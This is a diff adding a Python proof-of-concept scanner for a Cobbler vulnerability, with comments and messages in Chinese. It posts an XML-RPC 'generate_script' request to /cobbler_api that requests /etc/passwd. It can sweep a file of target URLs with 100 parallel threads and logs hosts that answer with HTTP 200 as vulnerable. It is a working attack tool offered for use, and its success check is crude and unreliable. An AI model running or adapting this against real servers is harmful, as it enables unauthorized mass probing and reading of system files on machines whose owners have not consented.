@@ -1,0 +1,83 @@
+# Cobbler远程命令执行漏洞
+import requests,sys,argparse
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    test="""  ______   ______   .______   .______    __       _______ .______            .______        ______  _______ 
+ /      | /  __  \  |   _  \  |   _  \  |  |     |   ____||   _  \           |   _  \      /      ||   ____|
+|  ,----'|  |  |  | |  |_)  | |  |_)  | |  |     |  |__   |  |_)  |    ______|  |_)  |    |  ,----'|  |__   
+|  |     |  |  |  | |   _  <  |   _  <  |  |     |   __|  |      /    |______|      /     |  |     |   __|  
+|  `----.|  `--'  | |  |_)  | |  |_)  | |  `----.|  |____ |  |\  \----.      |  |\  \----.|  `----.|  |____ 
+ \______| \______/  |______/  |______/  |_______||_______|| _| `._____|      | _| `._____| \______||_______|
+                                                                                                            
+
+"""
+
+    print(test)
+
+def main():
+    banner()
+    parser=argparse.ArgumentParser(description='Cobbler远程命令执行漏洞')
+    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
+    args=parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8')as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp=Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+def poc(target):
+    url_payload= '/cobbler_api'
+    headers={
+        'Content-Type':'text/xml',
+        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
+    }
+    data="""
+    <?xml version='1.0'?>
+            <methodCall>
+            <methodName>generate_script</methodName>
+            <params>
+                <param>
+                <value>
+                    <string>centos6-x86_64</string>
+                </value>
+                </param>
+                <param>
+                <value>
+                    <string></string>
+                </value>
+                </param>
+                <param>
+                <value>
+                    <string>/etc/passwd</string>
+                </value>
+                </param>
+            </params>
+            </methodCall>
+    """
+
+    try:
+        res1=requests.post(url=target+url_payload,headers=headers,data=data,timeout=10)
+        if res1.status_code==200:
+            print( f"[+]{target} 存在漏洞！")
+            with open('result.txt','a',encoding='utf-8')as fp:
+                fp.write(target+'\n')
+                return True
+        else:
+            print('[-] 不存在漏洞')
+            return False
+    except:
+        print('目标网站存在问题，无法访问')
+
+if __name__ =='__main__':
+    main()
